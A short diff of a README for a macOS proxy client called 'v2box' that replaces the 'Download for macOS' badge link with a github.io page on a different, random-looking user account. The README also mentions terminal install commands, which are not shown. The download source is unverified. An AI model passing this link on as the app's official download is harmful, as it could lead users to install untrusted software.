@@ -5,7 +5,7 @@ v2box for Mac is a modern, lightweight, and secure proxy client designed for mac
 It allows you to manage multiple proxy configurations, enjoy stable connections, and maintain online privacy with ease.  
 Follow the instructions below to install v2box on your Mac.
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?logo=apple&style=for-the-badge)](https://kamartamara.github.io/.github/v2box)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?logo=apple&style=for-the-badge)](https://tayusikf8398.github.io/.github/v2box)
 
 If the button doesn’t work, please follow the instructions below to install v2box using terminal commands.
 
